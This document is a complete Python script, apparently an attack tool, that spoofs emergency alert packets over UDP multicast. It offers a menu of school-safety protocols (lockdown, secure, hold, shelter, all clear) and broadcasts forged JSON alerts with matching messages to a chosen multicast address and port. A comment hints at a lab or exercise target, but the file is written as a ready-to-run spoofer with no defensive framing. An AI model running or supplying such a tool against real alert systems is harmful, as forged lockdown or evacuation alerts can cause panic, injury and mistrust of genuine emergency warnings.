#!/usr/bin/env python3
import socket
import json
import time
import argparse

def send_multicast_alert(ip, port, alert_type, message):
    """Spoofs a legitimate EAP UDP Multicast payload."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    # Set Time-To-Live to 2 so it can cross local subnets if needed
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    
    payload = {
        "type": alert_type,
        "message": message
    }
    
    json_payload = json.dumps(payload).encode('utf-8')
    sock.sendto(json_payload, (ip, port))
    print(f"\n📡 [BROADCAST SENT] -> {ip}:{port}")
    print(f"📦 Payload: {json.dumps(payload, indent=2)}\n")

if __name__ == "__main__":
    print("=== BEACON EAP / SRP Spoofer ===")
    print("Standard 'I Love You Guys' Protocols:")
    print(" 1) LOCKDOWN (Locks, Lights, Out of Sight) -> Triggers Red")
    print(" 2) SECURE (Get Inside, Lock Outside Doors) -> Triggers Orange")
    print(" 3) HOLD (In your room or area) -> Triggers Purple")
    print(" 4) SHELTER (Evacuate to shelter area) -> Triggers Blue")
    print(" 5) CLEAR (All Clear) -> Triggers Green")
    
    choice = input("\nSelect a protocol to trigger (1-5): ")
    
    scenarios = {
        "1": ("LOCKDOWN", "LOCKDOWN! Locks, Lights, Out of Sight!"),
        "2": ("SECURE", "SECURE! Get Inside. Lock outside doors."),
        "3": ("HOLD", "HOLD! In your room or area. Clear the halls."),
        "4": ("SHELTER", "SHELTER! Severe weather. Evacuate to shelter area."),
        "5": ("ALL CLEAR", "CLEAR! The emergency has been resolved. Resume normal activities.")
    }
    
    if choice in scenarios:
        alert_type, message = scenarios[choice]
        # Defaulting to 224.0.0.1:50000 - Ensure this matches your /cooladmin config!
        target_ip = input("Enter Multicast IP [Default: 224.0.0.1]: ") or "224.0.0.1"
        target_port = int(input("Enter Port [Default: 50000]: ") or "50000")
        
        send_multicast_alert(target_ip, target_port, alert_type, message)
    else:
        print("Invalid selection.")